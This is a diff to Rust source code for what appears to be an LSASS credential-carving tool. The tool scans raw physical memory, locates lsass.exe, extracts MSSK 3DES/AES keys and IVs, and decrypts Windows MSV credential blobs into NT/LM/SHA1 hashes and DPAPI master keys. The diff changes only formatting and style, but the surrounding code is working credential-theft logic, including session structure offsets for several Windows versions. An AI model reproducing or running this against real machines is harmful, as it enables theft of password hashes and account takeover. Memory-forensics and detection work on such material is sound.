@@ -4,7 +4,6 @@
 //!   Level 1 — Direct LSASS scan: find lsass.exe EPROCESS directly (bypass System process).
 //!   Level 2 — Raw page carving: scan ALL physical pages for self-contained crypto structures.
 
-use std::collections::{HashMap, HashSet};
 use crate::lsass::crypto::{self, CryptoKeys};
 use crate::lsass::dpapi;
 use crate::lsass::finder::{DiskPathRef, PagefileRef};
@@ -15,6 +14,7 @@ use crate::paging::translate::PageTableWalker;
 use crate::windows::eprocess::EprocessReader;
 use crate::windows::offsets::ALL_EPROCESS_OFFSETS;
 use crate::windows::process::Process;
+use std::collections::{HashMap, HashSet};
 
 use crate::lsass::msv::PRIMARY_CRED_OFFSET_VARIANTS as PRIMARY_CRED_OFFSETS;
 
@@ -60,15 +60,13 @@ pub fn carve_credentials<P: PhysicalMemory>(
             "[+] Carve L1: trying LSASS at phys=0x{:x}, PID={}, DTB=0x{:x}",
             process.eprocess_phys, process.pid, process.dtb
         );
-        match crate::lsass::finder::extract_all_credentials(
-            phys, process, 0, pagefile, disk_path,
-        ) {
+        match crate::lsass::finder::extract_all_credentials(phys, process, 0, pagefile, disk_path) {
             Ok(creds) => {
                 println!("[+] Carve L1: extracted {} logon sessions", creds.len());
                 return creds;
             }
             Err(e) => {
-                println!("[!] Carve L1: full extraction failed ({}), keeping DTB for L2", e);
+                println!("[!] Carve L1: full extraction failed ({e}), keeping DTB for L2");
                 lsass_dtb = Some(process.dtb);
             }
         }
@@ -80,7 +78,7 @@ pub fn carve_credentials<P: PhysicalMemory>(
 
     // Level 2: raw page carving using scan results
     println!("[*] Carve Level 2: extracting credentials from scan results...");
-    carve_level2(phys, lsass_dtb, scan)
+    carve_level2(phys, lsass_dtb, &scan)
 }
 
 // ---------------------------------------------------------------------------
@@ -99,7 +97,11 @@ const SCAN_CHUNK_SIZE: usize = 256 * 4096; // 1 MB
 fn combined_scan_pass<P: PhysicalMemory>(phys: &P) -> (Vec<Process>, ScanResults) {
     let lsass_pattern = b"lsass.exe\0\0\0\0\0\0"; // 15-byte ImageFileName
     let phys_size = phys.phys_size();
-    log::info!("Carve: combined_scan_pass phys_size=0x{:x} ({} MB)", phys_size, phys_size / (1024 * 1024));
+    log::info!(
+        "Carve: combined_scan_pass phys_size=0x{:x} ({} MB)",
+        phys_size,
+        phys_size / (1024 * 1024)
+    );
 
     let mut lsass_candidates = Vec::new();
     let mut results = ScanResults {
@@ -115,7 +117,10 @@ fn combined_scan_pass<P: PhysicalMemory>(phys: &P) -> (Vec<Process>, ScanResults
 
     while chunk_addr < phys_size {
         let read_len = SCAN_CHUNK_SIZE.min((phys_size - chunk_addr) as usize);
-        if phys.read_phys(chunk_addr, &mut chunk_buf[..read_len]).is_err() {
+        if phys
+            .read_phys(chunk_addr, &mut chunk_buf[..read_len])
+            .is_err()
+        {
             chunk_addr += read_len as u64;
             continue;
         }
@@ -127,9 +132,7 @@ fn combined_scan_pass<P: PhysicalMemory>(phys: &P) -> (Vec<Process>, ScanResults
             let page_addr = chunk_addr + page_off as u64;
 
             // Skip zero pages (fast check on 8-byte boundaries, then full)
-            if page[0..8] == [0; 8] && page[4088..4096] == [0; 8]
-                && page.iter().all(|&b| b == 0)
-            {
+            if page[0..8] == [0; 8] && page[4088..4096] == [0; 8] && page.iter().all(|&b| b == 0) {
                 page_off += 4096;
                 continue;
             }
@@ -154,7 +157,9 @@ fn combined_scan_pass<P: PhysicalMemory>(phys: &P) -> (Vec<Process>, ScanResults
                         if let Some(key) = crypto::extract_key_from_bcrypt_data(page, off) {
                             log::info!(
                                 "Carve: MSSK key at phys=0x{:x}+0x{:x}: {} bytes",
-                                page_addr, off, key.len()
+                                page_addr,
+                                off,
+                                key.len()
                             );
                             results.mssk_keys.push((page_addr + off as u64, key));
                             has_mssk = true;
@@ -166,13 +171,17 @@ fn combined_scan_pass<P: PhysicalMemory>(phys: &P) -> (Vec<Process>, ScanResults
                 if off + 4 <= 4096 {
                     let sig = super::types::read_u32_le(page, off).unwrap_or(0);
                     if sig == 0x0008_0007 && verify_primary_signature(page, off) {
-                        results.primary_hits.push((page_addr + off as u64, page_addr));
+                        results
+                            .primary_hits
+                            .push((page_addr + off as u64, page_addr));
                     }
                 }
 
                 // DPAPI entry signature
                 if dpapi::try_dpapi_entry_match(page, off) {
-                    results.dpapi_hits.push((page_addr + off as u64, page.to_vec()));
+                    results
+                        .dpapi_hits
+                        .push((page_addr + off as u64, page.to_vec()));
                 }
             }
 
@@ -187,7 +196,11 @@ fn combined_scan_pass<P: PhysicalMemory>(phys: &P) -> (Vec<Process>, ScanResults
         // --- Session structure scan (chunk-level, 8-byte aligned) ---
         // Look for plausible session entries across the entire chunk.
         // LUID is at +0x70 in all Vista+ x64 variants.
-        scan_chunk_for_sessions(&chunk_buf[..read_len], chunk_addr, &mut results.session_candidates);
+        scan_chunk_for_sessions(
+            &chunk_buf[..read_len],
+            chunk_addr,
+            &mut results.session_candidates,
+        );
 
         chunk_addr += read_len as u64;
     }
@@ -196,11 +209,7 @@ fn combined_scan_pass<P: PhysicalMemory>(phys: &P) -> (Vec<Process>, ScanResults
 }
 
 /// Try to validate a `lsass.exe` string match as a real EPROCESS.
-fn try_validate_lsass<P: PhysicalMemory>(
-    phys: &P,
-    match_phys: u64,
-    candidates: &mut Vec<Process>,
-) {
+fn try_validate_lsass<P: PhysicalMemory>(phys: &P, match_phys: u64, candidates: &mut Vec<Process>) {
     let phys_size = phys.phys_size();
 
     for offsets in ALL_EPROCESS_OFFSETS {
@@ -215,9 +224,8 @@ fn try_validate_lsass<P: PhysicalMemory>(
             _ => continue,
         };
 
-        let dtb = match reader.read_dtb(phys, eprocess_phys) {
-            Ok(dtb) => dtb,
-            Err(_) => continue,
+        let Ok(dtb) = reader.read_dtb(phys, eprocess_phys) else {
+            continue;
         };
         let dtb_base = dtb & PAGE_PHYS_MASK;
         if dtb_base == 0 || dtb_base >= phys_size {
@@ -237,15 +245,13 @@ fn try_validate_lsass<P: PhysicalMemory>(
 
         if !validate_dtb(phys, dtb) {
             log::info!(
-                "Carve: lsass candidate at 0x{:x} rejected: DTB 0x{:x} fails PML4 validation",
-                eprocess_phys, dtb
+                "Carve: lsass candidate at 0x{eprocess_phys:x} rejected: DTB 0x{dtb:x} fails PML4 validation"
             );
             continue;
         }
 
         log::info!(
-            "Carve: found lsass.exe EPROCESS at phys=0x{:x}, PID={}, DTB=0x{:x}, PEB=0x{:x}",
-            eprocess_phys, pid, dtb, peb
+            "Carve: found lsass.exe EPROCESS at phys=0x{eprocess_phys:x}, PID={pid}, DTB=0x{dtb:x}, PEB=0x{peb:x}"
         );
 
         // Avoid duplicate candidates (same PID+DTB)
@@ -293,16 +299,12 @@ fn validate_dtb<P: PhysicalMemory>(phys: &P, dtb: u64) -> bool {
     // and all present entries must have frames within physical range
     if !(1..=50).contains(&present) || valid_frames != present {
         log::info!(
-            "Carve: DTB 0x{:x} PML4 check: present={}, valid_frames={} — rejected",
-            dtb, present, valid_frames
+            "Carve: DTB 0x{dtb:x} PML4 check: present={present}, valid_frames={valid_frames} — rejected"
         );
         return false;
     }
 
-    log::info!(
-        "Carve: DTB 0x{:x} PML4 validated: {} present entries",
-        dtb, present
-    );
+    log::info!("Carve: DTB 0x{dtb:x} PML4 validated: {present} present entries");
     true
 }
 
@@ -313,15 +315,15 @@ fn validate_dtb<P: PhysicalMemory>(phys: &P, dtb: u64) -> bool {
 /// Carve credentials from raw physical pages using pre-computed scan results.
 /// If `lsass_dtb` is provided (from Level 1), uses it for VA→PA translation
 /// and LSASS-focused key extraction.
-fn carve_level2<P: PhysicalMemory>(phys: &P, lsass_dtb: Option<u64>, scan: ScanResults) -> Vec<Credential> {
-
+fn carve_level2<P: PhysicalMemory>(
+    phys: &P,
+    lsass_dtb: Option<u64>,
+    scan: &ScanResults,
+) -> Vec<Credential> {
     // Resolve crypto keys: prefer LSASS-focused extraction, fall back to physical scan keys.
-    let (des_key, aes_key) = match resolve_crypto_keys(phys, lsass_dtb, &scan.mssk_keys) {
-        Some(keys) => keys,
-        None => {
-            println!("[!] Carve L2: no valid 3DES/AES keys found — cannot decrypt credentials");
-            return Vec::new();
-        }
+    let Some((des_key, aes_key)) = resolve_crypto_keys(phys, lsass_dtb, &scan.mssk_keys) else {
+        println!("[!] Carve L2: no valid 3DES/AES keys found — cannot decrypt credentials");
+        return Vec::new();
     };
 
     println!(
@@ -376,13 +378,22 @@ fn carve_level2<P: PhysicalMemory>(phys: &P, lsass_dtb: Option<u64>, scan: ScanR
             }
             let max_keys = if has_3des_targets { 2 } else { 8 };
 
-            let alt_key_list: Vec<CryptoKeys> = all_key_pairs.iter().take(max_keys).map(|(dk, ak)| {
-                CryptoKeys { iv: [0u8; 16], des_key: dk.clone(), aes_key: ak.clone() }
-            }).collect();
+            let alt_key_list: Vec<CryptoKeys> = all_key_pairs
+                .iter()
+                .take(max_keys)
+                .map(|(dk, ak)| CryptoKeys {
+                    iv: [0u8; 16],
+                    des_key: dk.clone(),
+                    aes_key: ak.clone(),
+                })
+                .collect();
 
-            println!("[*] Carve L2: trying {} key combos × {} targets in single pass{}...",
-                alt_key_list.len(), targets.len(),
-                if has_3des_targets { " (3DES)" } else { "" });
+            println!(
+                "[*] Carve L2: trying {} key combos × {} targets in single pass{}...",
+                alt_key_list.len(),
+                targets.len(),
+                if has_3des_targets { " (3DES)" } else { "" }
+            );
 
             if let Some(msv) = search_blob_multi_keys(phys, &targets, &alt_key_list) {
                 msv_creds.push(msv);
@@ -400,9 +411,13 @@ fn carve_level2<P: PhysicalMemory>(phys: &P, lsass_dtb: Option<u64>, scan: ScanR
 
     // For DPAPI: try to resolve IV (first block matters for master key correctness).
     // If IV can't be resolved, use zero IV (first 16B of master key will be wrong).
-    let dpapi_keys = if let Some(iv) = resolve_iv(phys, &scan, &des_key, &aes_key, lsass_dtb) {
+    let dpapi_keys = if let Some(iv) = resolve_iv(phys, scan, &des_key, &aes_key, lsass_dtb) {
         println!("[+] Carve L2: IV resolved: {}", hex::encode(iv));
-        CryptoKeys { iv, des_key, aes_key }
+        CryptoKeys {
+            iv,
+            des_key,
+            aes_key,
+        }
     } else {
         println!("[!] Carve L2: no valid IV found — DPAPI master keys may be partially incorrect");
         msv_keys
@@ -451,28 +466,48 @@ struct SessionLayout {
 const SESSION_LAYOUTS: &[SessionLayout] = &[
     // LIST_63 (Win10 1607+ / Win11)
     SessionLayout {
-        username: 0x90, domain: 0xA0, logon_type: 0xD8,
-        session_id: 0xE8, logon_time: 0xF0, min_size: 0x108,
+        username: 0x90,
+        domain: 0xA0,
+        logon_type: 0xD8,
+        session_id: 0xE8,
+        logon_time: 0xF0,
+        min_size: 0x108,
     },
     // LIST_65 (Win11 24H2 newer)
     SessionLayout {
-        username: 0xA0, domain: 0xB0, logon_type: 0xE8,
-        session_id: 0xF8, logon_time: 0x100, min_size: 0x118,
+        username: 0xA0,
+        domain: 0xB0,
+        logon_type: 0xE8,
+        session_id: 0xF8,
+        logon_time: 0x100,
+        min_size: 0x118,
     },
     // LIST_64 (Win11 24H2 early)
     SessionLayout {
-        username: 0x98, domain: 0xA8, logon_type: 0xE0,
-        session_id: 0xF0, logon_time: 0xF8, min_size: 0x110,
+        username: 0x98,
+        domain: 0xA8,
+        logon_type: 0xE0,
+        session_id: 0xF0,
+        logon_time: 0xF8,
+        min_size: 0x110,
     },
     // LIST_62 (Win8/8.1)
     SessionLayout {
-        username: 0x80, domain: 0x90, logon_type: 0xC8,
-        session_id: 0xD8, logon_time: 0xE0, min_size: 0xF8,
+        username: 0x80,
+        domain: 0x90,
+        logon_type: 0xC8,
+        session_id: 0xD8,
+        logon_time: 0xE0,
+        min_size: 0xF8,
     },
     // LIST_60 (Win7)
     SessionLayout {
-        username: 0x80, domain: 0x90, logon_type: 0xB8,
-        session_id: 0xBC, logon_time: 0xC0, min_size: 0xD8,
+        username: 0x80,
+        domain: 0x90,
+        logon_type: 0xB8,
+        session_id: 0xBC,
+        logon_time: 0xC0,
+        min_size: 0xD8,
     },
 ];
 
@@ -483,7 +518,8 @@ const FT_2100: u64 = 157_766_112_000_000_000;
 /// Enrich credentials with session metadata from pre-computed candidates.
 /// The candidates were collected during the combined_scan_pass (no second memory pass needed).
 fn enrich_session_metadata(candidates: &HashMap<u64, SessionMeta>, credentials: &mut [Credential]) {
-    let target_luids: HashSet<u64> = credentials.iter()
+    let target_luids: HashSet<u64> = credentials
+        .iter()
         .map(|c| c.luid)
         .filter(|&l| l != 0)
         .collect();
@@ -492,9 +528,16 @@ fn enrich_session_metadata(candidates: &HashMap<u64, SessionMeta>, credentials: 
         return;
     }
 
-    let found_count = target_luids.iter().filter(|l| candidates.contains_key(l)).count();
+    let found_count = target_luids
+        .iter()
+        .filter(|l| candidates.contains_key(l))
+        .count();
     if found_count > 0 {
-        println!("[+] Carve: found session metadata for {}/{} LUIDs", found_count, target_luids.len());
+        println!(
+            "[+] Carve: found session metadata for {}/{} LUIDs",
+            found_count,
+            target_luids.len()
+        );
     }
 
     // Merge into credentials
@@ -541,18 +584,30 @@ fn validate_session_entry(
     }
 
     // Read inline fields
-    let logon_type = u32::from_le_bytes(entry[layout.logon_type..layout.logon_type + 4].try_into().ok()?);
+    let logon_type = u32::from_le_bytes(
+        entry[layout.logon_type..layout.logon_type + 4]
+            .try_into()
+            .ok()?,
+    );
     if logon_type > 13 {
         return None;
     }
 
-    let logon_time = u64::from_le_bytes(entry[layout.logon_time..layout.logon_time + 8].try_into().ok()?);
+    let logon_time = u64::from_le_bytes(
+        entry[layout.logon_time..layout.logon_time + 8]
+            .try_into()
+            .ok()?,
+    );
     // LogonTime must be in a plausible range, OR zero (for SYSTEM/special accounts)
     if logon_time != 0 && !(FT_2000..=FT_2100).contains(&logon_time) {
         return None;
     }
 
-    let session_id = u32::from_le_bytes(entry[layout.session_id..layout.session_id + 4].try_into().ok()?);
+    let session_id = u32::from_le_bytes(
+        entry[layout.session_id..layout.session_id + 4]
+            .try_into()
+            .ok()?,
+    );
     if session_id > 100 {
         return None;
     }
@@ -587,8 +642,10 @@ fn validate_session_entry(
     // i.e. the VA of this entry's LIST_ENTRY. We can estimate it from Flink/Blink neighborhood.
     // But simpler: use the entry's physical offset + Buffer VA page-offset approach.
     let entry_phys = chunk_base_phys + entry_off_in_chunk as u64;
-    let username = resolve_string_from_chunk(uname_meta, entry_phys, entry_va, chunk, chunk_base_phys);
-    let domain = resolve_string_from_chunk(domain_meta, entry_phys, entry_va, chunk, chunk_base_phys);
+    let username =
+        resolve_string_from_chunk(uname_meta, entry_phys, entry_va, chunk, chunk_base_phys);
+    let domain =
+        resolve_string_from_chunk(domain_meta, entry_phys, entry_va, chunk, chunk_base_phys);
 
     Some(SessionMeta {
         logon_type,
@@ -652,7 +709,7 @@ fn try_decode_utf16le_strict(data: &[u8]) -> Option<String> {
     // Strict UTF-16LE decode (no replacement chars — invalid surrogates = garbage)
     let s: String = char::decode_utf16(
         data.chunks_exact(2)
-            .map(|c| u16::from_le_bytes([c[0], c[1]]))
+            .map(|c| u16::from_le_bytes([c[0], c[1]])),
     )
     .collect::<std::result::Result<_, _>>()
     .ok()?;
@@ -663,9 +720,10 @@ fn try_decode_utf16le_strict(data: &[u8]) -> Option<String> {
     }
     // Reject control characters, private-use area (garbage), and common non-username chars.
     // Allow: alphanumeric (any script), spaces, hyphens, underscores, dots, @, apostrophes.
-    if !s.chars().all(|c| {
-        c.is_alphanumeric() || " -_.@'".contains(c)
-    }) {
+    if !s
+        .chars()
+        .all(|c| c.is_alphanumeric() || " -_.@'".contains(c))
+    {
         return None;
     }
     // Must start with alphanumeric (any script)
@@ -702,14 +760,9 @@ fn read_unicode_string_meta(entry: &[u8], offset: usize) -> Option<(usize, u64)>
     Some((len, buf_ptr))
 }
 
-
 /// Scan a memory chunk for plausible session structures and add them to candidates.
 /// This is called during the combined_scan_pass to avoid a second full memory pass.
-fn scan_chunk_for_sessions(
-    data: &[u8],
-    base: u64,
-    candidates: &mut HashMap<u64, SessionMeta>,
-) {
+fn scan_chunk_for_sessions(data: &[u8], base: u64, candidates: &mut HashMap<u64, SessionMeta>) {
     let luid_offset = 0x70usize;
 
     // Scan for 8-byte aligned positions where a non-trivial LUID could be at +0x70
@@ -723,12 +776,17 @@ fn scan_chunk_for_sessions(
         }
 
         // Skip if we already have a high-confidence match for this LUID
-        if candidates.get(&val).is_some_and(|m| m.logon_time != 0 && !m.username.is_empty()) {
+        if candidates
+            .get(&val)
+            .is_some_and(|m| m.logon_time != 0 && !m.username.is_empty())
+        {
             continue;
         }
 
         // This could be a LUID at offset 0x70 within a session entry
-        let Some(entry_off) = off.checked_sub(luid_offset) else { continue };
+        let Some(entry_off) = off.checked_sub(luid_offset) else {
+            continue;
+        };
 
         // Try each session layout variant
         for layout in SESSION_LAYOUTS {
@@ -736,15 +794,15 @@ fn scan_chunk_for_sessions(
                 continue;
             }
 
-            if let Some(meta) = validate_session_entry(
-                &data[entry_off..], layout, data, entry_off, base,
-            ) {
+            if let Some(meta) =
+                validate_session_entry(&data[entry_off..], layout, data, entry_off, base)
+            {
                 // Prefer entries with more metadata (LogonTime + username)
                 let dominated = candidates.get(&val).is_some_and(|existing| {
-                    let existing_score = (existing.logon_time != 0) as u8
-                        + (!existing.username.is_empty()) as u8;
-                    let new_score = (meta.logon_time != 0) as u8
-                        + (!meta.username.is_empty()) as u8;
+                    let existing_score = u8::from(existing.logon_time != 0)
+                        + u8::from(!existing.username.is_empty());
+                    let new_score =
+                        u8::from(meta.logon_time != 0) + u8::from(!meta.username.is_empty());
                     existing_score > new_score
                 });
                 if !dominated {
@@ -830,14 +888,17 @@ fn resolve_crypto_keys<P: PhysicalMemory>(
 ) -> Option<(Vec<u8>, Vec<u8>)> {
     if let Some(dtb) = lsass_dtb {
         let lsass_keys = find_lsass_mssk_keys(phys, dtb);
-        if !lsass_keys.is_empty() {
-            println!("[+] Carve L2: found {} MSSK keys in LSASS pages", lsass_keys.len());
+        if lsass_keys.is_empty() {
+            println!("[*] Carve L2: no MSSK keys in LSASS pages, using physical scan keys");
+        } else {
+            println!(
+                "[+] Carve L2: found {} MSSK keys in LSASS pages",
+                lsass_keys.len()
+            );
             if let Some(keys) = extract_crypto_keys(&lsass_keys) {
                 return Some(keys);
             }
             println!("[!] Carve L2: LSASS keys insufficient, trying all keys");
-        } else {
-            println!("[*] Carve L2: no MSSK keys in LSASS pages, using physical scan keys");
         }
     }
     extract_crypto_keys(scan_keys)
@@ -861,7 +922,10 @@ fn find_lsass_mssk_keys<P: PhysicalMemory>(phys: &P, dtb: u64) -> Vec<(u64, Vec<
             if let Some(key) = crypto::extract_key_from_bcrypt_data(&page, off) {
                 log::info!(
                     "Carve: LSASS MSSK at PA=0x{:x}+0x{:x} (VA=0x{:x}): {} bytes",
-                    mapping.paddr, off, mapping.vaddr + off as u64, key.len()
+                    mapping.paddr,
+                    off,
+                    mapping.vaddr + off as u64,
+                    key.len()
                 );
                 keys.push((mapping.paddr + off as u64, key));
             }
@@ -874,28 +938,46 @@ fn find_lsass_mssk_keys<P: PhysicalMemory>(phys: &P, dtb: u64) -> Vec<(u64, Vec<
 /// Build all (3DES, AES) key pair combinations from MSSK scan results.
 /// Used as fallback when the primary key pair doesn't validate.
 fn build_key_pairs(mssk_keys: &[(u64, Vec<u8>)]) -> Vec<(Vec<u8>, Vec<u8>)> {
+    static DUMMY_3DES: [u8; 24] = [0u8; 24];
     // Collect key refs — needed for nested iteration (can't borrow twice from iterator)
-    let des_keys: Vec<&[u8]> = mssk_keys.iter()
-        .filter_map(|(_, k)| if k.len() == 24 { Some(k.as_slice()) } else { None })
+    let des_keys: Vec<&[u8]> = mssk_keys
+        .iter()
+        .filter_map(|(_, k)| {
+            if k.len() == 24 {
+                Some(k.as_slice())
+            } else {
+                None
+            }
+        })
         .collect();
-    let aes_keys: Vec<&[u8]> = mssk_keys.iter()
-        .filter_map(|(_, k)| if k.len() == 16 || k.len() == 32 { Some(k.as_slice()) } else { None })
+    let aes_keys: Vec<&[u8]> = mssk_keys
+        .iter()
+        .filter_map(|(_, k)| {
+            if k.len() == 16 || k.len() == 32 {
+                Some(k.as_slice())
+            } else {
+                None
+            }
+        })
         .collect();
 
     let max_pairs = des_keys.len() * aes_keys.len() + aes_keys.len();
     let mut pairs = Vec::with_capacity(max_pairs.min(32));
 
     // Real key pairs (3DES + AES)
-    static DUMMY_3DES: [u8; 24] = [0u8; 24];
     'outer: for dk in &des_keys {
         for ak in &aes_keys {
             pairs.push((dk.to_vec(), ak.to_vec()));
-            if pairs.len() >= 32 { break 'outer; }
+            if pairs.len() >= 32 {
+                break 'outer;
+            }
         }
     }
     // AES-only pairs (dummy 3DES)
     for ak in &aes_keys {
-        if pairs.len() >= 32 { break; }
+        if pairs.len() >= 32 {
+            break;
+        }
         pairs.push((DUMMY_3DES.to_vec(), ak.to_vec()));
     }
     pairs
@@ -988,7 +1070,9 @@ fn resolve_iv<P: PhysicalMemory>(
                 if validate_primary_decryption(&decrypted) && validate_first_block(&decrypted) {
                     log::info!(
                         "Carve: IV validated (candidate #{}) at phys=0x{:x}: {}",
-                        iv_idx, primary_addr, hex::encode(iv)
+                        iv_idx,
+                        primary_addr,
+                        hex::encode(iv)
                     );
                     return Some(*iv);
                 }
@@ -1038,8 +1122,7 @@ fn read_blob_via_dtb_only<P: PhysicalMemory>(
     let mut buf = vec![0u8; blob_size];
     if phys.read_phys(blob_paddr, &mut buf).is_ok() && buf.iter().any(|&b| b != 0) {
         log::info!(
-            "Carve: blob via DTB: VA=0x{:x} → PA=0x{:x}, {} bytes",
-            blob_vptr, blob_paddr, blob_size
+            "Carve: blob via DTB: VA=0x{blob_vptr:x} → PA=0x{blob_paddr:x}, {blob_size} bytes"
         );
         Some(buf)
     } else {
@@ -1127,7 +1210,7 @@ fn carve_primary_credentials<P: PhysicalMemory>(
         let blob_size = match read_primary_blob_size(phys, *primary_addr) {
             Some(s) if (0x40..=0x400).contains(&s) => s as usize,
             sz => {
-                log::info!("Carve: Primary at 0x{:x}: invalid blob size {:?}", primary_addr, sz);
+                log::info!("Carve: Primary at 0x{primary_addr:x}: invalid blob size {sz:?}");
                 continue;
             }
         };
@@ -1135,7 +1218,9 @@ fn carve_primary_credentials<P: PhysicalMemory>(
         let blob_vptr_val = read_primary_blob_vptr(phys, *primary_addr);
         log::info!(
             "Carve: Primary at 0x{:x}: blob_size={}, blob_vptr={:?}",
-            primary_addr, blob_size, blob_vptr_val.map(|v| format!("0x{:x}", v))
+            primary_addr,
+            blob_size,
+            blob_vptr_val.map(|v| format!("0x{v:x}"))
         );
 
         // Strategy 1: VA→PA translation (fastest, most reliable)
@@ -1149,8 +1234,7 @@ fn carve_primary_credentials<P: PhysicalMemory>(
                             if let Some(msv) = extract_hashes_from_decrypted(&decrypted) {
                                 if seen_nt_hashes.insert(msv.nt_hash) {
                                     log::info!(
-                                        "Carve: MSV at Primary 0x{:x} via DTB (VA=0x{:x}→PA=0x{:x})",
-                                        primary_addr, blob_vptr, blob_paddr
+                                        "Carve: MSV at Primary 0x{primary_addr:x} via DTB (VA=0x{blob_vptr:x}→PA=0x{blob_paddr:x})"
                                     );
                                     results.push(msv);
                                     continue;
@@ -1174,7 +1258,7 @@ fn carve_primary_credentials<P: PhysicalMemory>(
             // Strategy 3: Nearby search (±4MB) — only when blob_vptr is unavailable
             if let Some(msv) = search_validated_blob(phys, *primary_addr, blob_size, keys, 1024) {
                 if seen_nt_hashes.insert(msv.nt_hash) {
-                    log::info!("Carve: MSV at Primary 0x{:x} via nearby search (±4MB)", primary_addr);
+                    log::info!("Carve: MSV at Primary 0x{primary_addr:x} via nearby search (±4MB)");
                     results.push(msv);
                 }
             }
@@ -1196,7 +1280,9 @@ fn carve_primary_credentials<P: PhysicalMemory>(
             va_offset_targets.len(),
             if has_3des { " (3DES)" } else { "" }
         );
-        if let Some(msv) = search_blob_multi_keys(phys, &va_offset_targets, std::slice::from_ref(keys)) {
+        if let Some(msv) =
+            search_blob_multi_keys(phys, &va_offset_targets, std::slice::from_ref(keys))
+        {
             if seen_nt_hashes.insert(msv.nt_hash) {
                 results.push(msv);
             }
@@ -1205,7 +1291,6 @@ fn carve_primary_credentials<P: PhysicalMemory>(
 
     results
 }
-
 
 /// Maximum bytes needed for SHA1 cross-validation of Primary credential hashes.
 /// Largest SHA1 offset (0x6C) + 20 bytes = 0x80 = 128 bytes, rounded to 16-byte AES block.
@@ -1218,7 +1303,7 @@ const VALIDATION_PREFIX_LEN: usize = 0x90; // 144 bytes = 9 AES blocks or 18 3DE
 /// regardless of how many key combos we try.
 fn search_blob_multi_keys<P: PhysicalMemory>(
     phys: &P,
-    targets: &[(usize, usize)],  // (blob_size, page_offset)
+    targets: &[(usize, usize)], // (blob_size, page_offset)
     keys_list: &[CryptoKeys],
 ) -> Option<MsvCredential> {
     let phys_size = phys.phys_size();
@@ -1227,7 +1312,10 @@ fn search_blob_multi_keys<P: PhysicalMemory>(
 
     while chunk_addr < phys_size {
         let read_len = SCAN_CHUNK_SIZE.min((phys_size - chunk_addr) as usize);
-        if phys.read_phys(chunk_addr, &mut chunk_buf[..read_len]).is_err() {
+        if phys
+            .read_phys(chunk_addr, &mut chunk_buf[..read_len])
+            .is_err()
+        {
             chunk_addr += read_len as u64;
             continue;
         }
@@ -1255,14 +1343,16 @@ fn search_blob_multi_keys<P: PhysicalMemory>(
                     let decrypted = if use_3des {
                         crypto::decrypt_prefix_3des(keys, enc_data, VALIDATION_PREFIX_LEN)
                     } else {
-                        let [first, _] = crypto::decrypt_prefix_both(keys, enc_data, VALIDATION_PREFIX_LEN);
+                        let [first, _] =
+                            crypto::decrypt_prefix_both(keys, enc_data, VALIDATION_PREFIX_LEN);
                         first
                     };
                     if let Some(dec) = &decrypted {
                         if let Some(msv) = extract_hashes_from_decrypted(dec) {
                             log::info!(
                                 "Carve: multi-key hit at phys=0x{:x}+0x{:x} ({})",
-                                chunk_addr + page_off as u64, page_offset,
+                                chunk_addr + page_off as u64,
+                                page_offset,
                                 if use_3des { "3DES" } else { "AES" }
                             );
                             return Some(msv);
@@ -1303,7 +1393,10 @@ fn search_validated_blob<P: PhysicalMemory>(
 
     while chunk_addr < search_end {
         let read_len = SCAN_CHUNK_SIZE.min((search_end - chunk_addr) as usize);
-        if phys.read_phys(chunk_addr, &mut chunk_buf[..read_len]).is_err() {
+        if phys
+            .read_phys(chunk_addr, &mut chunk_buf[..read_len])
+            .is_err()
+        {
             chunk_addr += read_len as u64;
             continue;
         }
@@ -1314,9 +1407,7 @@ fn search_validated_blob<P: PhysicalMemory>(
             let page_addr = chunk_addr + page_off as u64;
 
             // Skip zero pages
-            if page[0..8] == [0; 8] && page[4088..4096] == [0; 8]
-                && page.iter().all(|&b| b == 0)
-            {
+            if page[0..8] == [0; 8] && page[4088..4096] == [0; 8] && page.iter().all(|&b| b == 0) {
                 page_off += 4096;
                 continue;
             }
@@ -1335,15 +1426,21 @@ fn search_validated_blob<P: PhysicalMemory>(
                 let decrypted = if blob_size.is_multiple_of(8) {
                     crypto::decrypt_prefix_3des(keys, enc_data, VALIDATION_PREFIX_LEN)
                 } else {
-                    let [first, _] = crypto::decrypt_prefix_both(keys, enc_data, VALIDATION_PREFIX_LEN);
+                    let [first, _] =
+                        crypto::decrypt_prefix_both(keys, enc_data, VALIDATION_PREFIX_LEN);
                     first
                 };
                 if let Some(dec) = &decrypted {
                     if let Some(msv) = extract_hashes_from_decrypted(dec) {
                         log::info!(
                             "Carve: validated blob at phys=0x{:x}+0x{:x} ({})",
-                            page_addr, blob_off,
-                            if blob_size.is_multiple_of(8) { "3DES" } else { "AES" }
+                            page_addr,
+                            blob_off,
+                            if blob_size.is_multiple_of(8) {
+                                "3DES"
+                            } else {
+                                "AES"
+                            }
                         );
                         return Some(msv);
                     }
@@ -1358,7 +1455,6 @@ fn search_validated_blob<P: PhysicalMemory>(
 
     None
 }
-
 
 /// Extract NT/LM/SHA1 hashes from a decrypted Primary credential blob.
 ///
@@ -1423,7 +1519,9 @@ fn carve_dpapi_entries(
             if seen_guids.insert(cred.guid.clone()) {
                 log::info!(
                     "Carve: DPAPI entry at phys=0x{:x}: GUID={}, LUID=0x{:x}",
-                    entry_phys, cred.guid, luid
+                    entry_phys,
+                    cred.guid,
+                    luid
                 );
                 results.push((luid, cred));
             }
